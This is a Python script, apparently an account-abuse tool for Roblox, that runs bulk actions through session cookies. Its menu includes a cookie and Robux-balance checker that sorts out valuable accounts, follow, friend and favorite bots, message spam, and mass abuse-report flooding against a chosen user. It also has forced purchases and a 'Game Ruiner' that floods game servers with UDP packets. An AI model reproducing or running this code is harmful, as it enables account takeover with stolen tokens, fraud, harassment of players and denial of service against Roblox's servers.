from datetime import *
from colorama import *
import threading
import requests
import random
import socket
import time
import json
import os


with open('content\\cookies.txt', 'r') as cookies:
    cookies = cookies.read().splitlines()

with open('content\\proxies.txt', 'r') as proxies:
    proxies = proxies.read().splitlines()

print(':: Reading [config.json] and applying settings ~')

config = json.loads(
    open(
        'content\\config.json',
        'r'
    ).read()
)['config']

if config['cookies']['format'] == 1:
    print('(+) Enabled UPC | Username:Password:Cookie')

    print('(!) Formating cookies..., this may take some time!')

    batch = []

    for x in cookies:

        batch.append(
            '_|' + x.split('_|')[1]
        )

        print(Fore.GREEN + f'(+) Formating..: {len(batch)}/{len(cookies)}')
    
    cookies = batch

PROXY_TYPE = config['proxies']['type']
print(f'\n\nSelected proxies type is [{PROXY_TYPE}] ::/')



def retry_robux(cookie):
    threading.Thread(target=check_robux, args=(cookie, random.choice(proxies),)).start()

def check_cookie(cookie):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            username = session.get('https://users.roblox.com/v1/users/authenticated').json()['name']
            print(Fore.GREEN + f'(+) Cookie Valid')
            with open('checked_cookies.txt', 'a') as checked:
                checked.write(cookie + '\n')
    except:
        print(Fore.RED + '(!) Cookie Invalid / Error')

def select_cookie_checker():
    for x in cookies:
        start = threading.Thread(target=check_cookie,args=(x,))
        start.start()
        
    input()

def check_proxy(proxy):
    try:
        s = requests.get('http://www.google.com/', proxies={'http':proxy, 'https':proxy})
        if s.status_code == 200:
            print(Fore.GREEN + '(+) Proxy Valid')
            with open('checked_proxies.txt', 'a') as checked:
                checked.write(proxy + '\n')
    except:
        print(Fore.RED + '(!) Skipped')

def select_proxy_checker():
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    for x in proxies:
        start = threading.Thread(target=check_proxy,args=(x,))
        start.start()
        
    input()

def check_robux(cookie, prox):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            robux = session.get(f'https://api.roblox.com/currency/balance')
            if robux.status_code == 200:
                robux = robux.json()['robux']
                print(Fore.GREEN + f'(+) Robux {robux}')
                if robux > 0:
                    with open('robux_cookies.txt', 'a') as robux:
                        robux.write(cookie + '\n')
            # else:
            #     print(Fore.WHITE + robux.text + ' Retrying..')
            #     threading.Thread(target=retry_robux,args=(cookie,)).start()
            # pass
    except:
        print(Fore.RED + '(!) Skipped')
        



def select_robux_check():
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    pos = 0
    for x in cookies:
        try:
            proxy = proxies[pos]
            pos += 1
        except:
            proxy = random.choice(proxies)
        threading.Thread(target=check_robux, args=(x,proxy,)).start()
        
    input()

def retry_follow(cookie, userid):
    proxy = random.choice(proxies)
    threading.Thread(target=follow_user, args=(cookie,userid,proxy,)).start()

def follow_user(cookie, userid, prox):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            follow = session.post(f'https://friends.roblox.com/v1/users/{userid}/follow', proxies=proxy)
            if follow.status_code == 200:
                print(Fore.GREEN + '(+) Sent Follow')
            # else:
            #     print(Fore.WHITE + follow.text + ' Retrying..')
            #     threading.Thread(target=retry_follow,args=(cookie, userid,)).start()
    except:
        print(Fore.RED + '(!) Skipped')

def select_follow_bot():
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + '(-) Enter UserId')
    userid = input('>>> ')
    print(Fore.WHITE + '(-) Enter follow amount')
    amount = input('>>> ')
    for x in range(int(amount)):
        cookie = cookies[x]
        try:
            proxy = proxies[x]
        except:
            proxy = random.choice(proxies)
        threading.Thread(target=follow_user, args=(cookie,userid,proxy,)).start()
        
    input()

def send_friend(cookie, userid):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            friend = session.post(f'https://friends.roblox.com/v1/users/{userid}/request-friendship')
            if friend.status_code == 200:
                print(Fore.GREEN + '(+) Sent Friend')
            else:
                print(Fore.WHITE + friend.text)
    except:
        print(Fore.RED + '(!) Skipped')

def select_friend_bot():
    print(Fore.WHITE + '(-) Enter UserId')
    userid = input('>>> ')
    print(Fore.WHITE + '(-) Enter request amount')
    amount = input('>>> ')
    for x in range(int(amount)):
        cookie = cookies[x]
        threading.Thread(target=send_friend, args=(cookie,userid,)).start()
        
    input()

def send_sniper(cookie, asset, want_price):
    # Too lazy to make this faster, crappy code from 13 year old me :)))
    try:
        with requests.session() as session:
            prox = random.choice(proxies)
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            price = session.post('https://catalog.roblox.com/v1/catalog/items/details',timeout=15 , headers={'Content-Type':'application/json', 'Accept':'application/json'} ,data='{"items":[{"itemType":"Asset", "id":'+ f'"{asset}"'+'}]}', proxies={'http':prox, 'https':prox})
            lowest = price.json()['data'][0]['lowestPrice']
            print(Fore.WHITE + '{"check":"success", "enough":"N/A"}')
            if lowest < want_price or lowest == want_price:
                productid = price.json()['data'][0]['productId']
                buy = session.post(f'https://economy.roblox.com/v1/purchases/products/{productid}', data={'expectedCurrency':1, 'expectedPrice':lowest, 'expectedSellerId':1})
                print(buy.text)
                if buy.status_code == 200:
                    item_name = price.json()['data'][0]['name']
                    print(Fore.GREEN + f'(+) Successfully bought {item_name} for {lowest} robux!')
                else:
                    print(Fore.WHITE + buy.text)
    except:
        pass

def select_lim_sniper():
    print(Fore.YELLOW + '(!) Using first cookie in cookies.txt \n')
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + '(-) Enter AssetId')
    asset = input('>>> ')
    print(Fore.WHITE + '(-) Enter Robux Limit')
    limit = input('>>> ')
    print(Fore.WHITE + '(-) Started!')
    while True:
        threading.Thread(target=send_sniper,args=(cookies[0], asset, limit,)).start()
        time.sleep(0.2)

def send_message(cookie, message, covid):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            send = session.post(f'https://chat.roblox.com/v2/send-message', data={'conversationId':covid, 'message':message}, proxies=proxy)
            if send.status_code == 200:
                print(Fore.GREEN + '(+) Sent Message')
            else:
                print(Fore.WHITE + send.text)
    except:
        print(Fore.RED + '(!) Skipped')

def select_msg_spam():
    print(Fore.YELLOW + '(!) Using first cookie in cookies.txt \n')
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + f'(-) Enter ConversationId')
    conid = input('>>> ')
    print(Fore.WHITE + f'(-) Enter Message')
    message = input('>>> ')
    while True:
        threading.Thread(target=send_message, args=(cookies[0], message, conid,)).start()
        
    input()

def change_desc(cookie, desc):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            desc = session.post('https://accountinformation.roblox.com/v1/description', data={'description':desc})
            if desc.status_code == 200:
                print(Fore.GREEN + '(+) Description Changed')
            else:
                print(Fore.WHITE + desc.text)
    except:
        print(Fore.RED + '(!) Skipped')


def select_description_bot():
    print(Fore.WHITE + '(-) Enter description')
    desc = input('>>> ')
    for x in cookies:
        threading.Thread(target=change_desc,args=(x,desc,)).start()
        
    input()

def change_status(cookie, status):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            status = session.post('https://www.roblox.com/home/updatestatus', data={'status':status, 'sendToFacebook':False})
            if status.status_code == 200:
                print(Fore.GREEN + '(+) Status Changed')
            else:
                print(Fore.WHITE + status.text)
    except:
        print(Fore.RED + '(!) Skipped')

def select_status_change():
    print(Fore.WHITE + '(-) Enter status')
    status = input('>>> ')
    for x in cookies:
        threading.Thread(target=change_status,args=(x,status,)).start()
        
    input()

def select_visit_bot():
    print(Fore.YELLOW + '[! Launches clients on your pc \n')
    print(Fore.WHITE + '(-) Enter GameId')
    gameid = input('>>> ')
    while True:
        try:
            cookie = random.choice(cookies)
            with requests.session() as session:
                session.cookies['.ROBLOSECURITY'] = cookie
                session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
                xsrf_token = session.post('https://auth.roblox.com/v1/authentication-ticket/', headers={'referer':f'https://www.roblox.com/games/{gameid}'}).headers['rbx-authentication-ticket']
                browserId = random.randint(1000000, 10000000)
                os.system(f'start roblox-player:1+launchmode:play+gameinfo:{xsrf_token}+launchtime:{browserId}+placelauncherurl:https%3A%2F%2Fassetgame.roblox.com%2Fgame%2FPlaceLauncher.ashx%3Frequest%3DRequestGame%26browserTrackerId%3D{browserId}%26placeId%3D{gameid}%26isPlayTogetherGame%3Dfalse+browsertrackerid:{browserId}+robloxLocale:en_us+gameLocale:en_us+channel:')
                print(Fore.GREEN + '(+) Successful Launch')
                time.sleep(5)
        except:
            print(Fore.RED + '(!) Skipped')
def set_online(cookie):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            online = session.post('https://presence.roblox.com/v1/presence/register-app-presence')
            if online.status_code == 200:
                print(Fore.GREEN + '(+) Set Online')
            else:
                print(Fore.WHITE + online.text)
    except:
        print(Fore.RED + '(!) Skipped')

def select_set_online():
    for x in cookies:
        threading.Thread(target=set_online,args=(x,)).start()
        
    input()

def retry_unfollow(cookie, userid):
    threading.Thread(target=unfollow, args=(cookie, userid, random.choice(proxies),)).start()

def unfollow(cookie, userid, prox):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            follow = session.post(f'https://friends.roblox.com/v1/users/{userid}/unfollow', proxies=proxy)
            if follow.status_code == 200:
                print(Fore.GREEN + '(+) Sent Unfollow')
            else:
                print(Fore.WHITE + follow.text + ' Retrying..')
                threading.Thread(target=retry_unfollow,args=(cookie, userid,)).start()
    except:
        print(Fore.RED + '(!) Skipped')


def select_unfollow():
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + '(-) Enter UserId')
    userid = input('>>> ')
    pos = 0
    for x in cookies:
        cookie = x
        try:
            proxy = proxies[pos]
            pos += 1
        except:
            proxy = random.choice(proxies)
        threading.Thread(target=unfollow, args=(cookie,userid,)).start()
        
    input()

def retry_favorite(cookie, assetid):
    threading.Thread(target=favorite_asset, args=(cookie, assetid, random.choice(proxies),)).start()

def favorite_asset(cookie, assetid, prox):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            fav = session.post(f'https://www.roblox.com/favorite/toggle', proxies=proxy, data={'assetID':assetid})
            if fav.status_code == 200:
                print(Fore.GREEN + '(+) Sent favorite')
            else:
                print(Fore.WHITE + fav.text + ' Retrying..')
                threading.Thread(target=retry_favorite,args=(cookie, assetid,)).start()
    except:
        print(Fore.RED + '(!) Skipped')


def select_favorite_bot():
    pos = 0
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + '(-) Enter AssetId')
    asset = input('>>> ')
    print(Fore.WHITE + '(-) Enter favorite amount')
    amount = input('>>> ')
    for x in range(int(amount)):
        cookie = cookies[x]
        try:
            proxy = proxies[x]
            pos += 1
        except:
            proxy = random.choice(proxies)
        threading.Thread(target=favorite_asset,args=(cookie, asset,proxy,)).start()
        time.sleep(0.001)
    input()

def equip_change_avatar(cookie, asset):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            change = session.post(f'https://avatar.roblox.com/v1/avatar/assets/{asset}/wear')
            if change.status_code == 200:
                print(Fore.GREEN + '(+) Sent Change')
            else:
                print(Fore.WHITE + change.status_code)
    except:
        print(Fore.RED + '(!) Skipped')



def select_equip_asset():
    print(Fore.WHITE + '(-) Enter AssetId')
    asset = input('>>> ')
    for x in cookies:
        threading.Thread(target=equip_change_avatar, args=(x,asset,)).start()
        
    input()


def unequip_change_avatar(cookie, asset):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            change = session.post(f'https://avatar.roblox.com/v1/avatar/assets/{asset}/remove')
            if change.status_code == 200:
                print(Fore.GREEN + '(+) Sent Change')
            else:
                print(Fore.WHITE + change.status_code)
    except:
        print(Fore.RED + '(!) Skipped')



def select_unequip_asset():
    print(Fore.WHITE + '(-) Enter AssetId')
    asset = input('>>> ')
    for x in cookies:
        threading.Thread(target=unequip_change_avatar, args=(x,asset,)).start()
        
    input()

def buy_model(cookie, asset, userid):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            info = session.post('https://catalog.roblox.com/v1/catalog/items/details',timeout=15,headers={'Content-Type':'application/json', 'Accept':'application/json'} ,data='{"items":[{"itemType":"Asset", "id":'+ f'"{asset}"'+'}]}', proxies={'http':prox, 'https':prox})
            productId = info.json()['data'][0]['productId']
            expected_price = 0
            currency = 1
            buy = session.post(f'https://economy.roblox.com/v1/purchases/products/{productId}',timeout=15,proxies=proxy, data={'expectedCurrency':currency, 'expectedPrice':expected_price, 'expectedSellerId':userid})
            if buy.status_code == 200:
                print(Fore.GREEN + '(+) Bought Model')
                delete = session.post('https://www.roblox.com/asset/delete-from-inventory', data={'assetId':asset})
            else:
                print(Fore.WHITE + buy.text)
    except:
        print(Fore.RED + '(!) Skipped')

def select_model_bot():
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + '(-) Enter AssetId')
    asset = input('>>> ')
    print(Fore.WHITE + '(-) Enter UserId')
    userid = input('>>> ')
    while True:
        threading.Thread(target=buy_model, args=(random.choice(cookies), asset, userid,)).start()
        

def buy_asset(cookie, asset):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            prox = random.choice(proxies)
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            info = session.post('https://catalog.roblox.com/v1/catalog/items/details', headers={'Content-Type':'application/json', 'Accept':'application/json'} ,data='{"items":[{"itemType":"Asset", "id":'+ f'"{asset}"'+'}]}', proxies={'http':prox, 'https':prox})
            productId = info.json()['data'][0]['productId']
            expected_price = info.json()['data'][0]['price']
            currency = 1
            buy = session.post(f'https://economy.roblox.com/v1/purchases/products/{productId}', proxies=proxy, data={'expectedCurrency':currency, 'expectedPrice':expected_price, 'expectedSellerId':1})
            if buy.status_code == 200:
                print(Fore.GREEN + '(+) Bought Asset')
            else:
                print(Fore.WHITE + buy.text)
    except:
        print(Fore.RED + '(!) Skipped')

def select_buy_asset():
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + '(-) Enter AssetId')
    asset = input('>>> ')
    for x in cookies:
        threading.Thread(target=buy_asset, args=(x, asset,)).start()
        
    input()

def kill_cookie(cookie):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            logout = session.post('https://auth.roblox.com/v2/logout')
            if logout.status_code == 200:
                print(Fore.GREEN + '(+) Cookie killed')
            else:
                print(Fore.WHITE + logout.text)
    except:
        print(Fore.RED + '(!) Skipped')

def select_cookie_killer():
    for x in cookies:
        threading.Thread(target=kill_cookie, args=(x,)).start()
        time.sleep(0.001)
    input()

def send_report(cookie, prox, userid):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            __RequestVerificationToken = session.get(f'https://www.roblox.com/abusereport/userprofile?id={userid}').text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('" />')[0]
            report = session.post(f'https://www.roblox.com/abusereport/userprofile?id={userid}', proxies=proxy, data={'__RequestVerificationToken':__RequestVerificationToken, 'ReportCategory':1, 'Comment':'', 'Id':userid, 'RedirectUrl':f'https://www.roblox.com/abusereport/userprofile?id={userid}', 'PartyGuid':'', 'ConversationId':''})
            if report.status_code == 200 or report.status_code == 302:
                print(Fore.GREEN + f'(+) Sent report')
    except:
        print(Fore.RED + '(!) Skipped')

def select_report_bot():
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + f'(-) Enter UserId')
    userid = input('>>> ')
    print(Fore.WHITE + f'(-) Enter Report Amount')
    amount = input('>>> ')
    for x in range(int(amount)):
        try:
            proxy = proxies[x]
        except:
            proxy = random.choice(proxies)
        cookie = random.choice(cookies)
        threading.Thread(target=send_report, args=(cookie, proxy, userid,)).start()
        time.sleep(0.1)
    input()

def send_ally(cookie, groupId, prox):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            proxy = {'http':f'{PROXY_TYPE}://'+prox, 'https':f'{PROXY_TYPE}://'+prox}
            target = random.randint(1, 9342195)
            send_ally = session.post(f'https://groups.roblox.com/v1/groups/{groupId}/relationships/allies/{target}', proxies=proxy)
            if send_ally.status_code == 200:
                print(Fore.GREEN + '(+) Sent Ally')
    except:
        print(Fore.RED + '(!) Skipped')

def select_ally_bot():
    print(Fore.YELLOW + '(!) Using first cookie in cookies.txt \n')
    print(Fore.YELLOW + '(!) This feature uses proxies \n')
    print(Fore.WHITE + '(-) Enter GroupId')
    groupid = input('>>> ')
    while True:
        cookie = cookies[0]
        proxy = random.choice(proxies)
        threading.Thread(target=send_ally, args=(cookie, groupid, proxy,)).start()
        

def send_attack(cookie, gameid):
    try:
        with requests.session() as session:
            session.cookies['.ROBLOSECURITY'] = cookie
            browserId = random.randint(1000000, 10000000)
            for x in range(30):
                try:
                    join = session.post(f'https://assetgame.roblox.com/game/PlaceLauncher.ashx?request=RequestGame&browserTrackerId={browserId}&placeId={gameid}&isPlayTogetherGame=false', headers={'User-Agent':'User-Agent: Roblox/WinInet'})
                    joinscript = join.json()['joinScriptUrl']
                    joinscript_request = session.post(joinscript, headers={'User-Agent':'User-Agent: Roblox/WinInet'})
                    json_data = joinscript_request.text.split('==%')[1]
                    joinScriptJson = json.loads(json_data)
                    session.post(joinScriptJson['PingUrl'])
                    host = joinScriptJson['MachineAddress']
                    port = joinScriptJson['ServerPort']
                    username = joinScriptJson['UserName']
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect((host, port))
                    s.send(random._urandom(3500))
                    print(Fore.GREEN + f'(+) Sent Packet [{username}:{host}:{port}]')
                    break
                except:
                    pass
    except:
        print(Fore.RED + '(!) Skipped')



def select_game_attack():
    print(Fore.YELLOW + '(!) This attacks ROBLOX games by sending alot of packets! \n')
    print(Fore.RED + '(!) HARM DONE WITH THIS IS NOT ON US USE AT RISK \n')
    print(Fore.WHITE + '(-) Enter GameId')
    gameid = input('>>> ')
    while True:
        threading.Thread(target=send_attack, args=(random.choice(cookies), gameid,)).start()

def regen_cookie(cookie):
    with requests.session() as session:
        try:
            session.cookies['.ROBLOSECURITY'] = cookie
            session.headers['x-csrf-token'] = session.post('https://friends.roblox.com/v1/users/1/request-friendship').headers['x-csrf-token']
            ncookie = session.post('https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate', data={'__RequestVerificationToken':''}).cookies['.ROBLOSECURITY']
            open('new_cookies.txt', 'a').write(ncookie + '\n')
            print(Fore.GREEN + cookie)
        except:
            open('new_cookies.txt', 'a').write(cookie + '\n')

def select_secure_signout():
    for x in cookies:
        threading.Thread(target=regen_cookie, args=(x,)).start()
    input()
    quit()

def main():
    print(Fore.LIGHTBLUE_EX + '''
 ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ███▄ ▄███▓▓██   ██▓
▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒ ▒██  ██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░  ▒██ ██░
░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██    ▒██   ░ ▐██▓░
 ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒  ░ ██▒▓░
 ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░   ██▒▒▒ 
  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░  ░      ░ ▓██ ░▒░ 
  ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░      ░    ▒ ▒ ░░  
      ░  ░         ░       ░  ░            ░ ░         ░    ░ ░     
                                                            ░ ░     
    ''')
    print(Fore.BLUE + '-----------------------------------------------------------------------------------------------------------------------')
    print(Fore.WHITE +'''
[1]: Cookie check  / [2]: Proxy check  / [3]: Robux check
[4]: Follow bot    / [5]: Friend bot   / [6]: Lim Sniper
[7]: Message spam  / [8]: Desc bot     / [9]: Status bot
[10]: Set online   / [11]: Visit bot   / [12]: Unfollow bot
[13]: Fav bot      / [14]: Equip Item  / [15]: Unequip Item
[16]: Model bot    / [17]: Buy asset   / [18]: Kill Cookies
[19]: Report bot   / [20]: Ally bot    / [21]: Secure Signout
[22]: Game Ruiner  
    ''')
    print(Fore.BLUE + '-----------------------------------------------------------------------------------------------------------------------')
    print(Fore.WHITE + f'-> {len(cookies)} cookies!')
    print(Fore.WHITE + f'-> {len(proxies)} proxies!')
    print(Fore.BLUE)
    selection = input('>>> ')
    selections = [select_cookie_checker, select_proxy_checker, select_robux_check, select_follow_bot, select_friend_bot, select_lim_sniper, select_msg_spam, select_description_bot, select_status_change, select_set_online, select_visit_bot, select_unfollow, select_favorite_bot, select_equip_asset, select_unequip_asset, select_model_bot, select_buy_asset, select_cookie_killer, select_report_bot, select_ally_bot, select_secure_signout, select_game_attack]
    selections[int(selection) - 1]()


main()